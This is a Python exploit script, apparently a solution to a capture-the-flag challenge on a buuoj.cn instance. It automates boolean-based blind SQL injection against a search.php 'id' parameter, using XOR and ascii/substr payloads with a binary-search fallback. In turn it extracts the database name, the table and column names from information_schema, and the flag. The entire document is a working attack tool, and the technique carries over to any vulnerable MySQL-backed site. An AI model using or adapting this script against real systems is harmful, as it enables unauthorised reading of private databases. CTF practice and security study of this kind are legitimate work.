#!/usr/bin/env python3
import requests
import string

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """True = 条件为真(页面正常), False = 条件为假(ERROR)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" not in r.text and "Error" not in r.text
    except:
        return False

def get_length(query, max_len=100):
    """获取字符串长度"""
    for i in range(1, max_len):
        # 0^(condition) : condition为真时返回正常
        payload = f"0^(({query})={i})"
        if check(payload):
            return i
    return 0

def get_char(query, pos):
    """获取指定位置的字符"""
    for c in string.printable:
        if c in "'\"\\": continue
        payload = f"0^(ascii(substr(({query}),{pos},1))={ord(c)})"
        if check(payload):
            return c
    # 二分查找
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f"0^(ascii(substr(({query}),{pos},1))>{mid})"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if 32 <= low <= 126 else ""

def blind_extract(query, name=""):
    """盲注提取数据"""
    length = get_length(query)
    print(f"[*] {name} length: {length}")
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        result += c
        print(f"    {name}: {result}")
    return result

# 获取数据库名
db = blind_extract("database()", "Database")

# 获取表名  
tables = blind_extract("select group_concat(table_name) from information_schema.tables where table_schema=database()", "Tables")

# 获取列名
cols = blind_extract("select group_concat(column_name) from information_schema.columns where table_schema=database()", "Columns")

# 获取flag
flag = blind_extract("select flag from flag", "Flag")
print(f"\n[+] FLAG: {flag}")
